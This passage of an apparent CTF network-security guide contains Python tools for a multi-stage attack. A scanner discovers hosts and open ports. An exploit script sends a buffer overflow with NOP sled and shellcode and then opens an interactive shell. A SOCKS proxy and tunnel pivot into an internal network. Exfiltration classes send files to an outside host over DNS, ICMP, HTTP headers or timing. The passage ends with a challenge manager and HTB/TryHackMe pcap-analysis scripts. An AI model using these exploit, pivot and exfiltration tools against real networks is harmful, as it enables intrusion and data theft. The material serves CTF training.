        94: 'SSH_MSG_CHANNEL_DATA',
        95: 'SSH_MSG_CHANNEL_EXTENDED_DATA',
        96: 'SSH_MSG_CHANNEL_EOF',
        97: 'SSH_MSG_CHANNEL_CLOSE',
        98: 'SSH_MSG_CHANNEL_REQUEST',
    }
    
    return ssh_messages.get(msg_type, f'UNKNOWN_{msg_type}')

def analyze_ssh_handshake(pcap_file):
    """Analyze SSH protocol handshake"""
    packets = rdpcap(pcap_file)
    
    ssh_sessions = {}
    
    for pkt in packets:
        if TCP in pkt and Raw in pkt:
            payload = bytes(pkt[Raw].load)
            
            # Check for SSH version exchange
            if payload.startswith(b'SSH-'):
                version = payload.decode('utf-8', errors='ignore').strip()
                src = f"{pkt[IP].src}:{pkt[TCP].sport}"
                dst = f"{pkt[IP].dst}:{pkt[TCP].dport}"
                
                print(f"[*] SSH Version Exchange")
                print(f"    {src} -> {dst}")
                print(f"    Version: {version}\n")
                
                continue
            
            # Parse SSH packets (after key exchange)
            ssh_pkt = parse_ssh_packet(payload)
            if ssh_pkt:
                msg_type_name = identify_ssh_message_type(ssh_pkt['message_type'])
                src = f"{pkt[IP].src}:{pkt[TCP].sport}"
                dst = f"{pkt[IP].dst}:{pkt[TCP].dport}"
                
                print(f"[*] SSH Message: {msg_type_name}")
                print(f"    {src} -> {dst}")
                print(f"    Length: {ssh_pkt['packet_length']}\n")

def extract_ssh_keys(pcap_file):
    """
    Attempt to extract SSH host keys from handshake
    [Unverified: Success depends on protocol details and encryption]
    """
    packets = rdpcap(pcap_file)
    
    for pkt in packets:
        if TCP in pkt and Raw in pkt:
            payload = bytes(pkt[Raw].load)
            
            ssh_pkt = parse_ssh_packet(payload)
            if ssh_pkt and ssh_pkt['message_type'] == 31:  # KEXDH_REPLY
                print("[+] Found SSH_MSG_KEXDH_REPLY (contains host key)")
                print(f"    Payload length: {len(payload)} bytes")
                
                # Save for further analysis
                with open('ssh_kexdh_reply.bin', 'wb') as f:
                    f.write(payload)
                
                print("    [*] Saved to ssh_kexdh_reply.bin")

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) != 2:
        print("Usage: ssh_analyzer.py <pcap_file>")
        sys.exit(1)
    
    print("=== SSH Protocol Analysis ===\n")
    analyze_ssh_handshake(sys.argv[1])
    extract_ssh_keys(sys.argv[1])
```

---

## Multi-Stage Network Challenges

### Scenario: Multi-Hop Pivot Chain

**Stage 1: Initial Foothold Discovery**

```python
#!/usr/bin/env python3
# stage1_recon.py - Discover initial entry point

from scapy.all import *
import ipaddress

def discover_live_hosts(network):
    """Discover live hosts on network"""
    print(f"[*] Scanning network: {network}")
    
    live_hosts = []
    
    # ICMP ping sweep
    ans, unans = sr(IP(dst=str(network))/ICMP(), timeout=2, verbose=0)
    
    for sent, received in ans:
        live_hosts.append(received[IP].src)
        print(f"[+] Live host: {received[IP].src}")
    
    return live_hosts

def port_scan(target, ports=[21, 22, 23, 80, 443, 3389, 8080]):
    """Quick port scan of target"""
    print(f"\n[*] Scanning ports on {target}")
    
    open_ports = []
    
    # SYN scan
    ans, unans = sr(IP(dst=target)/TCP(dport=ports, flags='S'), 
                    timeout=2, verbose=0)
    
    for sent, received in ans:
        if received[TCP].flags == 'SA':  # SYN-ACK
            port = received[TCP].sport
            open_ports.append(port)
            print(f"[+] Port {port}/tcp open")
            
            # Send RST to close connection
            send(IP(dst=target)/TCP(dport=port, flags='R'), verbose=0)
    
    return open_ports

def analyze_service(target, port):
    """Banner grab and service identification"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((target, port))
        
        # Try to receive banner
        banner = sock.recv(1024)
        sock.close()
        
        print(f"\n[+] Banner from {target}:{port}")
        print(f"    {banner.decode('utf-8', errors='ignore')[:100]}")
        
        return banner
    except Exception as e:
        return None

if __name__ == '__main__':
    import sys
    import socket
    
    if len(sys.argv) != 2:
        print("Usage: stage1_recon.py <network_cidr>")
        sys.exit(1)
    
    network = ipaddress.IPv4Network(sys.argv[1])
    
    # Step 1: Host discovery
    hosts = discover_live_hosts(network)
    
    # Step 2: Port scanning
    for host in hosts:
        open_ports = port_scan(host)
        
        # Step 3: Service enumeration
        for port in open_ports:
            analyze_service(host, port)
```

**Stage 2: Exploit Vulnerable Service**

```python
#!/usr/bin/env python3
# stage2_exploit.py - Exploit discovered vulnerability

import socket
import struct
import time

class VulnerableServiceExploit:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.sock = None
    
    def connect(self):
        """Establish connection to vulnerable service"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        self.sock.connect((self.target_ip, self.target_port))
        print(f"[+] Connected to {self.target_ip}:{self.target_port}")
        
        # Receive banner
        banner = self.sock.recv(1024)
        print(f"[*] Banner: {banner.decode('utf-8', errors='ignore').strip()}")
    
    def exploit_buffer_overflow(self):
        """
        Exploit buffer overflow vulnerability
        [Inference: Specific to challenge - adjust offsets/shellcode]
        """
        print("[*] Crafting exploit payload...")
        
        # Buffer overflow parameters
        buffer_size = 1024
        offset_to_ret = 512
        
        # Shellcode: reverse shell (example - adjust as needed)
        # msfvenom -p linux/x86/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f python
        shellcode = (
            b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
            b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
        )
        
        # NOP sled
        nop_sled = b"\x90" * (offset_to_ret - len(shellcode))
        
        # Return address (adjust based on target)
        ret_addr = struct.pack('<I', 0xbffff000)  # Example address
        
        # Construct payload
        payload = nop_sled + shellcode + ret_addr
        payload += b"A" * (buffer_size - len(payload))
        
        print(f"[*] Payload size: {len(payload)} bytes")
        print(f"[*] Sending exploit...")
        
        try:
            self.sock.sendall(payload)
            time.sleep(1)
            
            # Check for shell
            self.sock.sendall(b"id\n")
            response = self.sock.recv(4096)
            
            if response:
                print(f"[+] Exploit successful!")
                print(f"[+] Response: {response.decode('utf-8', errors='ignore')}")
                return True
            
        except Exception as e:
            print(f"[!] Exploit failed: {e}")
            return False
    
    def get_shell(self):
        """Interactive shell"""
        print("[*] Entering interactive shell...")
        print("[*] Type 'exit' to quit\n")
        
        import sys
        
        while True:
            try:
                # Get command from user
                cmd = input("shell> ")
                
                if cmd.lower() == 'exit':
                    break
                
                # Send command
                self.sock.sendall(cmd.encode() + b'\n')
                
                # Receive output
                time.sleep(0.5)
                output = self.sock.recv(4096)
                print(output.decode('utf-8', errors='ignore'))
            
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[!] Error: {e}")
                break

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) != 3:
        print("Usage: stage2_exploit.py <target_ip> <target_port>")
        sys.exit(1)
    
    exploit = VulnerableServiceExploit(sys.argv[1], int(sys.argv[2]))
    
    try:
        exploit.connect()
        
        if exploit.exploit_buffer_overflow():
            exploit.get_shell()
    
    except Exception as e:
        print(f"[!] Exploitation failed: {e}")
        import traceback
        traceback.print_exc()
```

**Stage 3: Pivot to Internal Network**

```python
#!/usr/bin/env python3
# stage3_pivot.py - Establish pivot to internal network

import socket
import threading
import select
import struct

class SOCKSProxy:
    """Simple SOCKS4 proxy for pivoting"""
    
    def __init__(self, listen_port, pivot_host, pivot_port):
        self.listen_port = listen_port
        self.pivot_host = pivot_host
        self.pivot_port = pivot_port
        self.server_sock = None
    
    def start(self):
        """Start SOCKS proxy server"""
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_sock.bind(('0.0.0.0', self.listen_port))
        self.server_sock.listen(5)
        
        print(f"[+] SOCKS proxy listening on port {self.listen_port}")
        print(f"[+] Pivoting through {self.pivot_host}:{self.pivot_port}")
        
        while True:
            try:
                client_sock, addr = self.server_sock.accept()
                print(f"[*] Connection from {addr[0]}:{addr[1]}")
                
                thread = threading.Thread(target=self.handle_client, 
                                        args=(client_sock,))
                thread.daemon = True
                thread.start()
            
            except KeyboardInterrupt:
                print("\n[*] Shutting down proxy...")
                break
    
    def handle_client(self, client_sock):
        """Handle SOCKS4 client connection"""
        try:
            # Read SOCKS4 request
            request = client_sock.recv(1024)
            
            if len(request) < 9:
                client_sock.close()
                return
            
            # Parse SOCKS4 request
            version = request[0]
            command = request[1]
            dst_port = struct.unpack('>H', request[2:4])[0]
            dst_ip = socket.inet_ntoa(request[4:8])
            
            print(f"[*] SOCKS request: {dst_ip}:{dst_port}")
            
            if version != 4 or command != 1:  # Only support SOCKS4 CONNECT
                self.send_socks_response(client_sock, False)
                client_sock.close()
                return
            
            # Connect to pivot server
            pivot_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            pivot_sock.connect((self.pivot_host, self.pivot_port))
            
            # Send tunneling command through pivot
            tunnel_cmd = f"CONNECT {dst_ip}:{dst_port}\n".encode()
            pivot_sock.sendall(tunnel_cmd)
            
            # Wait for pivot confirmation
            response = pivot_sock.recv(1024)
            
            if b'OK' in response:
                # Send SOCKS success response
                self.send_socks_response(client_sock, True)
                
                # Start bidirectional relay
                self.relay_traffic(client_sock, pivot_sock)
            else:
                self.send_socks_response(client_sock, False)
                pivot_sock.close()
                client_sock.close()
        
        except Exception as e:
            print(f"[!] Error handling client: {e}")
            client_sock.close()
    
    def send_socks_response(self, sock, success):
        """Send SOCKS4 response"""
        if success:
            response = b'\x00\x5a' + b'\x00' * 6  # Request granted
        else:
            response = b'\x00\x5b' + b'\x00' * 6  # Request rejected
        
        sock.sendall(response)
    
    def relay_traffic(self, sock1, sock2):
        """Bidirectional traffic relay"""
        sockets = [sock1, sock2]
        
        while True:
            try:
                readable, _, _ = select.select(sockets, [], [], 30)
                
                if not readable:
                    break
                
                for sock in readable:
                    data = sock.recv(4096)
                    
                    if not data:
                        return
                    
                    # Forward to other socket
                    other_sock = sock2 if sock == sock1 else sock1
                    other_sock.sendall(data)
            
            except Exception as e:
                break
        
        sock1.close()
        sock2.close()

class TunnelManager:
    """Manage SSH-like tunnel through compromised host"""
    
    def __init__(self, compromised_host, compromised_port):
        self.host = compromised_host
        self.port = compromised_port
        self.sock = None
    
    def establish_tunnel(self):
        """Create tunnel through compromised host"""
        print(f"[*] Establishing tunnel through {self.host}:{self.port}")
        
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
        
        # Send tunnel initialization command
        init_cmd = b"TUNNEL_INIT\n"
        self.sock.sendall(init_cmd)
        
        response = self.sock.recv(1024)
        
        if b'READY' in response:
            print("[+] Tunnel established successfully")
            return True
        
        return False
    
    def port_forward(self, local_port, remote_host, remote_port):
        """Forward local port through tunnel to remote host"""
        print(f"[*] Setting up port forward: localhost:{local_port} -> {remote_host}:{remote_port}")
        
        # Create local listener
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(('127.0.0.1', local_port))
        listener.listen(5)
        
        print(f"[+] Port forward active on localhost:{local_port}")
        
        while True:
            try:
                client, addr = listener.accept()
                print(f"[*] New connection to forwarded port from {addr}")
                
                # Request tunnel connection
                tunnel_request = f"FORWARD {remote_host} {remote_port}\n".encode()
                self.sock.sendall(tunnel_request)
                
                # Start relay
                thread = threading.Thread(target=self.relay_forward, 
                                        args=(client, self.sock))
                thread.daemon = True
                thread.start()
            
            except KeyboardInterrupt:
                break
    
    def relay_forward(self, client_sock, tunnel_sock):
        """Relay traffic through tunnel"""
        # [Inference: Simplified relay - real implementation needs proper multiplexing]
        try:
            while True:
                readable, _, _ = select.select([client_sock, tunnel_sock], [], [], 10)
                
                for sock in readable:
                    data = sock.recv(4096)
                    if not data:
                        return
                    
                    other = tunnel_sock if sock == client_sock else client_sock
                    other.sendall(data)
        
        except:
            pass
        finally:
            client_sock.close()

def discover_internal_network(pivot_host, pivot_port):
    """Discover internal network through pivot"""
    print("[*] Discovering internal network...")
    
    # Connect through pivot
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((pivot_host, pivot_port))
    
    # Request internal network information
    cmd = b"GET_NETWORK_INFO\n"
    sock.sendall(cmd)
    
    response = sock.recv(4096)
    network_info = response.decode('utf-8', errors='ignore')
    
    print(f"[+] Internal network information:")
    print(network_info)
    
    sock.close()
    
    return network_info

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: stage3_pivot.py <mode> [args]")
        print("  Modes:")
        print("    socks <listen_port> <pivot_host> <pivot_port>")
        print("    tunnel <pivot_host> <pivot_port> <local_port> <remote_host> <remote_port>")
        print("    discover <pivot_host> <pivot_port>")
        sys.exit(1)
    
    mode = sys.argv[1]
    
    if mode == 'socks':
        if len(sys.argv) != 5:
            print("Usage: stage3_pivot.py socks <listen_port> <pivot_host> <pivot_port>")
            sys.exit(1)
        
        proxy = SOCKSProxy(int(sys.argv[2]), sys.argv[3], int(sys.argv[4]))
        proxy.start()
    
    elif mode == 'tunnel':
        if len(sys.argv) != 7:
            print("Usage: stage3_pivot.py tunnel <pivot_host> <pivot_port> <local_port> <remote_host> <remote_port>")
            sys.exit(1)
        
        tunnel = TunnelManager(sys.argv[2], int(sys.argv[3]))
        if tunnel.establish_tunnel():
            tunnel.port_forward(int(sys.argv[4]), sys.argv[5], int(sys.argv[6]))
    
    elif mode == 'discover':
        if len(sys.argv) != 4:
            print("Usage: stage3_pivot.py discover <pivot_host> <pivot_port>")
            sys.exit(1)
        
        discover_internal_network(sys.argv[2], int(sys.argv[3]))
```

**Stage 4: Data Exfiltration**

```python
#!/usr/bin/env python3
# stage4_exfiltration.py - Exfiltrate data through covert channels

import socket
import base64
import time
from scapy.all import *

class DNSTunnelExfiltration:
    """Exfiltrate data via DNS queries"""
    
    def __init__(self, dns_server, domain):
        self.dns_server = dns_server
        self.domain = domain
    
    def exfiltrate_file(self, filepath, chunk_size=32):
        """
        Exfiltrate file via DNS subdomain queries
        [Inference: Assumes controlled DNS server logging queries]
        """
        print(f"[*] Exfiltrating {filepath} via DNS tunnel")
        
        with open(filepath, 'rb') as f:
            data = f.read()
        
        # Encode data
        encoded = base64.b32encode(data).decode('ascii').lower()
        
        # Split into chunks
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        
        print(f"[*] Total chunks: {len(chunks)}")
        
        for i, chunk in enumerate(chunks):
            # Create DNS query: chunk.sequence.domain
            query_name = f"{chunk}.{i:04d}.{self.domain}"
            
            # Send DNS query
            try:
                query = IP(dst=self.dns_server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=query_name))
                send(query, verbose=0)
                
                if (i + 1) % 10 == 0:
                    print(f"[*] Sent {i+1}/{len(chunks)} chunks")
                
                time.sleep(0.1)  # Rate limiting
            
            except Exception as e:
                print(f"[!] Error sending chunk {i}: {e}")
        
        print("[+] Exfiltration complete")

class ICMPTunnelExfiltration:
    """Exfiltrate data via ICMP echo requests"""
    
    def __init__(self, target_ip):
        self.target = target_ip
    
    def exfiltrate_file(self, filepath, chunk_size=64):
        """Exfiltrate file via ICMP payload"""
        print(f"[*] Exfiltrating {filepath} via ICMP tunnel")
        
        with open(filepath, 'rb') as f:
            data = f.read()
        
        # Split into chunks
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
        
        print(f"[*] Total chunks: {len(chunks)}")
        
        for i, chunk in enumerate(chunks):
            # Create ICMP packet with data in payload
            packet = IP(dst=self.target)/ICMP(type=8, id=0xdead, seq=i)/Raw(load=chunk)
            
            send(packet, verbose=0)
            
            if (i + 1) % 10 == 0:
                print(f"[*] Sent {i+1}/{len(chunks)} chunks")
            
            time.sleep(0.05)
        
        print("[+] Exfiltration complete")

class HTTPStegoExfiltration:
    """Exfiltrate data via HTTP headers"""
    
    def __init__(self, target_url):
        self.target = target_url
    
    def exfiltrate_file(self, filepath, chunk_size=512):
        """Exfiltrate file via HTTP User-Agent header"""
        print(f"[*] Exfiltrating {filepath} via HTTP headers")
        
        with open(filepath, 'rb') as f:
            data = f.read()
        
        encoded = base64.b64encode(data).decode('ascii')
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        
        print(f"[*] Total chunks: {len(chunks)}")
        
        import urllib.request
        
        for i, chunk in enumerate(chunks):
            try:
                # Embed data in User-Agent header
                headers = {
                    'User-Agent': f'Mozilla/5.0 ({chunk})',
                    'X-Session-ID': str(i),
                    'X-Total-Chunks': str(len(chunks))
                }
                
                req = urllib.request.Request(self.target, headers=headers)
                urllib.request.urlopen(req, timeout=5)
                
                if (i + 1) % 10 == 0:
                    print(f"[*] Sent {i+1}/{len(chunks)} chunks")
                
                time.sleep(0.2)
            
            except Exception as e:
                print(f"[!] Error sending chunk {i}: {e}")
        
        print("[+] Exfiltration complete")

class SlowLorisExfiltration:
    """
    Exfiltrate via timing-based covert channel
    [Inference: Requires precise timing measurement on receiver side]
    """
    
    def __init__(self, target_ip, target_port):
        self.target = target_ip
        self.port = target_port
    
    def exfiltrate_byte(self, byte_value):
        """Encode byte value in connection timing"""
        # Map byte value to delay (in milliseconds)
        delay = byte_value / 255.0 * 0.5  # 0-500ms range
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target, self.port))
            
            # Introduce precise delay
            time.sleep(delay)
            
            sock.sendall(b"GET / HTTP/1.1\r\n")
            sock.close()
        
        except:
            pass
    
    def exfiltrate_file(self, filepath):
        """Exfiltrate file via timing channel"""
        print(f"[*] Exfiltrating {filepath} via timing channel")
        print("[!] This is slow - only use for small amounts of data")
        
        with open(filepath, 'rb') as f:
            data = f.read()
        
        # Limit to small files
        if len(data) > 256:
            print("[!] File too large for timing channel (max 256 bytes)")
            data = data[:256]
        
        for i, byte in enumerate(data):
            self.exfiltrate_byte(byte)
            
            if (i + 1) % 10 == 0:
                print(f"[*] Exfiltrated {i+1}/{len(data)} bytes")
            
            time.sleep(1)  # Spacing between bytes
        
        print("[+] Exfiltration complete")

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: stage4_exfiltration.py <method> <file> [args]")
        print("  Methods:")
        print("    dns <file> <dns_server> <domain>")
        print("    icmp <file> <target_ip>")
        print("    http <file> <target_url>")
        print("    timing <file> <target_ip> <target_port>")
        sys.exit(1)
    
    method = sys.argv[1]
    filepath = sys.argv[2]
    
    if method == 'dns':
        if len(sys.argv) != 5:
            print("Usage: stage4_exfiltration.py dns <file> <dns_server> <domain>")
            sys.exit(1)
        
        exfil = DNSTunnelExfiltration(sys.argv[3], sys.argv[4])
        exfil.exfiltrate_file(filepath)
    
    elif method == 'icmp':
        if len(sys.argv) != 4:
            print("Usage: stage4_exfiltration.py icmp <file> <target_ip>")
            sys.exit(1)
        
        exfil = ICMPTunnelExfiltration(sys.argv[3])
        exfil.exfiltrate_file(filepath)
    
    elif method == 'http':
        if len(sys.argv) != 4:
            print("Usage: stage4_exfiltration.py http <file> <target_url>")
            sys.exit(1)
        
        exfil = HTTPStegoExfiltration(sys.argv[3])
        exfil.exfiltrate_file(filepath)
    
    elif method == 'timing':
        if len(sys.argv) != 5:
            print("Usage: stage4_exfiltration.py timing <file> <target_ip> <target_port>")
            sys.exit(1)
        
        exfil = SlowLorisExfiltration(sys.argv[3], int(sys.argv[4]))
        exfil.exfiltrate_file(filepath)
```

### Challenge Orchestration Framework

**Multi-Stage Challenge Manager**

```python
#!/usr/bin/env python3
# challenge_manager.py - Orchestrate multi-stage CTF network challenge

import json
import time
import subprocess
from datetime import datetime

class ChallengeStage:
    """Represents a single stage in multi-stage challenge"""
    
    def __init__(self, stage_id, name, description, objectives):
        self.id = stage_id
        self.name = name
        self.description = description
        self.objectives = objectives
        self.completed = False
        self.completion_time = None
        self.hints_used = []
    
    def mark_complete(self):
        """Mark stage as completed"""
        self.completed = True
        self.completion_time = datetime.utcnow().isoformat()
    
    def to_dict(self):
        """Serialize stage to dictionary"""
        return {
            'id': self.id,
            'name': self.name,
            'description': self.description,
            'objectives': self.objectives,
            'completed': self.completed,
            'completion_time': self.completion_time,
            'hints_used': self.hints_used
        }

class NetworkChallengeManager:
    """Manage multi-stage network challenge"""
    
    def __init__(self, challenge_config_file):
        self.stages = []
        self.current_stage = 0
        self.start_time = None
        self.load_config(challenge_config_file)
    
    def load_config(self, config_file):
        """Load challenge configuration"""
        with open(config_file, 'r') as f:
            config = json.load(f)
        
        for stage_data in config['stages']:
            stage = ChallengeStage(
                stage_data['id'],
                stage_data['name'],
                stage_data['description'],
                stage_data['objectives']
            )
            self.stages.append(stage)
        
        print(f"[+] Loaded challenge with {len(self.stages)} stages")
    
    def start_challenge(self):
        """Initialize challenge"""
        self.start_time = datetime.utcnow()
        print("\n" + "="*60)
        print("MULTI-STAGE NETWORK CTF CHALLENGE")
        print("="*60)
        print(f"Started: {self.start_time.isoformat()}\n")
        
        self.show_current_stage()
    
    def show_current_stage(self):
        """Display current stage information"""
        if self.current_stage >= len(self.stages):
            self.challenge_complete()
            return
        
        stage = self.stages[self.current_stage]
        
        print(f"\n{'='*60}")
        print(f"STAGE {stage.id}: {stage.name}")
        print(f"{'='*60}")
        print(f"\n{stage.description}\n")
        print("Objectives:")
        for i, obj in enumerate(stage.objectives, 1):
            print(f"  {i}. {obj}")
        print()
    
    def submit_flag(self, flag):
        """Validate flag submission"""
        stage = self.stages[self.current_stage]
        
        # Validate flag format
        expected_format = f"CTF{{stage{stage.id}_"
        
        if not flag.startswith(expected_format):
            print("[!] Invalid flag format")
            return False
        
        # In real implementation, validate against actual flag
        print(f"[+] Flag accepted for Stage {stage.id}!")
        stage.mark_complete()
        
        self.current_stage += 1
        
        if self.current_stage < len(self.stages):
            print(f"\n[*] Stage {stage.id} complete! Moving to next stage...\n")
            time.sleep(2)
            self.show_current_stage()
        else:
            self.challenge_complete()
        
        return True
    
    def get_hint(self, hint_number):
        """Provide hint for current stage"""
        stage = self.stages[self.current_stage]
        
        hints = {
            1: ["Check for open ports on the target network",
                "Try scanning with nmap: nmap -sV target_network"],
            2: ["Look for buffer overflow vulnerabilities",
                "The service doesn't properly validate input length"],
            3: ["Analyze the network traffic for pivot opportunities",
                "Check for SSH or other remote access services"],
            4: ["Data exfiltration might use covert channels",
                "DNS queries can carry hidden data"]
        }
        
        stage_hints = hints.get(stage.id, ["No hints available"])
        
        if hint_number > len(stage_hints):
            print(f"[!] Only {len(stage_hints)} hints available for this stage")
            return
        
        hint = stage_hints[hint_number - 1]
        stage.hints_used.append(hint_number)
        
        print(f"\n[HINT {hint_number}]: {hint}\n")
    
    def challenge_complete(self):
        """Handle challenge completion"""
        end_time = datetime.utcnow()
        duration = end_time - self.start_time
        
        print("\n" + "="*60)
        print("CHALLENGE COMPLETE!")
        print("="*60)
        print(f"\nTotal time: {duration}")
        print(f"Stages completed: {len([s for s in self.stages if s.completed])}/{len(self.stages)}")
        
        # Calculate score
        base_score = 1000
        time_bonus = max(0, 500 - int(duration.total_seconds() / 60))
        hint_penalty = sum(len(s.hints_used) * 50 for s in self.stages)
        
        final_score = base_score + time_bonus - hint_penalty
        
        print(f"\nFinal Score: {final_score}")
        print(f"  Base: {base_score}")
        print(f"  Time bonus: {time_bonus}")
        print(f"  Hint penalty: -{hint_penalty}")
        
        # Save results
        self.save_results()
    
    def save_results(self):
        """Save challenge results"""
        results = {
            'start_time': self.start_time.isoformat(),
            'end_time': datetime.utcnow().isoformat(),
            'stages': [s.to_dict() for s in self.stages]
        }
        
        with open('challenge_results.json', 'w') as f:
            json.dump(results, f, indent=2)
        
        print("\n[*] Results saved to challenge_results.json")
    
    def interactive_mode(self):
        """Interactive challenge interface"""
        self.start_challenge()
        
        while self.current_stage < len(self.stages):
            try:
                print("\nCommands: flag <flag> | hint <number> | status | quit")
                cmd = input("> ").strip()
                
                if not cmd:
                    continue
                
                parts = cmd.split(maxsplit=1)
                action = parts[0].lower()
                
                if action == 'flag' and len(parts) == 2:
                    self.submit_flag(parts[1])
                
                elif action == 'hint' and len(parts) == 2:
                    try:
                        hint_num = int(parts[1])
                        self.get_hint(hint_num)
                    except ValueError:
                        print("[!] Invalid hint number")
                
                elif action == 'status':
                    self.show_current_stage()
                
                elif action == 'quit':
                    print("[*] Exiting challenge...")
                    break
                
                else:
                    print("[!] Unknown command")
            
            except KeyboardInterrupt:
                print("\n[*] Challenge interrupted")
                break

if __name__ == '__main__':
    import sys
    
    # Example challenge configuration
    example_config = {
        "stages": [
            {
                "id": 1,
                "name": "Network Reconnaissance",
                "description": "Discover live hosts and open ports in the target network.",
                "objectives": [
                    "Identify all live hosts in 192.168.100.0/24",
                    "Enumerate open ports on discovered hosts",
                    "Identify service versions"
                ]
            },
            {
                "id": 2,
                "name": "Initial Exploitation",
                "description": "Exploit vulnerable service to gain initial foothold.",
                "objectives": [
                    "Identify vulnerable service",
                    "Develop or adapt exploit",
                    "Gain shell access"
                ]
            },
            {
                "id": 3,
                "name": "Lateral Movement",
                "description": "Pivot through compromised host to access internal network.",
                "objectives": [
                    "Establish tunnel/pivot",
                    "Discover internal network topology",
                    "Access secondary target"
                ]
            },
            {
                "id": 4,
                "name": "Data Exfiltration",
                "description": "Extract sensitive data using covert channels.",
                "objectives": [
                    "Locate sensitive data",
                    "Exfiltrate without detection",
                    "Retrieve final flag"
                ]
            }
        ]
    }
    
    # Save example config
    with open('challenge_config.json', 'w') as f:
        json.dump(example_config, f, indent=2)
    
    # Run challenge manager
    manager = NetworkChallengeManager('challenge_config.json')
    manager.interactive_mode()
```

---

## Important Subtopics

**Network Steganography** - Hiding data in protocol fields, timing channels, and packet payloads for covert communication

**IPv6 Tunneling Attacks** - Exploiting IPv6-over-IPv4 tunnels and transition mechanisms for evasion and persistence

**Container Escape via Network** - Breaking out of containerized environments through network-based exploitation

**Wireless Protocol Exploitation** - WPA2/3 attacks, evil twin access points, and Wi-Fi protocol vulnerabilities in CTF scenarios

**BGP Hijacking Simulations** - Understanding routing protocol manipulation and man-in-the-middle attacks at the AS level

---

# Practice & Resources

## CTF Platform Navigation (HTB, THM, etc.)

### Hack The Box (HTB)

**Network Traffic Analysis Challenges:**

```bash
# HTB platform structure for network challenges
# URL: https://www.hackthebox.com

# Challenge categories relevant to packet analysis:
# - Forensics (most PCAP challenges)
# - Crypto (encrypted traffic analysis)
# - Web (HTTP/HTTPS traffic inspection)
# - Misc (custom protocols)

# Accessing challenges:
# 1. Join HTB and select "Challenges" tab
# 2. Filter by "Forensics" or search "pcap", "wireshark", "network"
# 3. Download challenge files (typically .pcap, .pcapng, or .zip)

# Common HTB challenge patterns:
# - Password-protected captures (use provided hints)
# - Multi-stage flags (follow traffic chronologically)
# - Encrypted protocols (look for key exchange)
# - Steganography in packet data
```

**HTB-Specific Tools Setup:**

```bash
# Install HTB VPN connectivity (for active machines)
sudo openvpn lab_username.ovpn

# Capture your own traffic during HTB labs
sudo tcpdump -i tun0 -w htb_capture.pcap

# Filter HTB-specific traffic patterns
tshark -r htb_capture.pcap -Y "ip.dst == 10.10.10.0/24 or ip.src == 10.10.10.0/24"

# Common HTB challenge file extraction
unzip challenge.zip
# Password often format: hackthebox or provided in challenge description
```

**HTB Challenge Workflow:**

```bash
# Standard HTB forensics challenge approach
cat > htb_workflow.sh << 'EOF'
#!/bin/bash

CHALLENGE_FILE="$1"

if [ -z "$CHALLENGE_FILE" ]; then
    echo "Usage: $0 <pcap_file>"
    exit 1
fi

echo "[*] HTB Challenge Analysis: $CHALLENGE_FILE"

# Quick overview
echo -e "\n[*] File info:"
capinfos "$CHALLENGE_FILE"

# Protocol hierarchy
echo -e "\n[*] Protocol distribution:"
tshark -r "$CHALLENGE_FILE" -q -z io,phs

# Look for common flag patterns
echo -e "\n[*] Searching for flags (HTB{...}):"
tshark -r "$CHALLENGE_FILE" -Y "frame contains \"HTB{\"" -T fields -e data.text

# Check for common exfiltration ports
echo -e "\n[*] Checking suspicious ports:"
tshark -r "$CHALLENGE_FILE" -T fields -e tcp.port -e udp.port | \
    sort | uniq -c | sort -rn | head -10

# Extract objects
echo -e "\n[*] Extracting HTTP objects:"
tshark -r "$CHALLENGE_FILE" --export-objects http,http_objects/ 2>/dev/null
ls -lh http_objects/ 2>/dev/null || echo "No HTTP objects found"

echo -e "\n[*] Quick analysis complete. Review findings above."
EOF

chmod +x htb_workflow.sh
```

### TryHackMe (THM)

**Network Analysis Rooms:**

```bash
# Relevant THM rooms for PCAP analysis:
# URL: https://tryhackme.com

# Recommended learning paths:
# - "Wireshark 101" (Room ID: wireshark)
# - "Wireshark: Traffic Analysis" (wireshark101)
# - "Wireshark: Packet Operations" (wiresharkthebasics)
# - "NetworkMiner" (networkminer)
# - "Zeek" (zeekbro)
# - "Snort" (snort)

# THM often provides in-browser access via AttackBox
# Download PCAPs to local machine:
scp -i thm_key user@MACHINE_IP:/path/to/capture.pcap ./

# THM flag format: THM{...}
```

**THM Practice Environment:**

```bash
# Setup THM OpenVPN connection
sudo openvpn username.ovpn

# Verify connectivity to THM network
ping 10.10.x.x  # Target IP from room

# Capture traffic during THM challenges
sudo tcpdump -i tun0 -w thm_practice.pcap

# Common THM challenge extraction
# Many THM rooms provide pre-captured files in /root/Rooms/ or ~/Desktop/
```

**THM-Specific Analysis Script:**

```bash
cat > thm_analyzer.sh << 'EOF'
#!/bin/bash

PCAP="$1"

echo "[THM] Network Analysis Challenge"
echo "================================"

# Check for THM flag format
echo -e "\n[*] Searching for THM flags:"
strings "$PCAP" | grep -E "THM\{[^}]+\}" --color=always

# Common THM challenge elements
echo -e "\n[*] Checking for FTP credentials:"
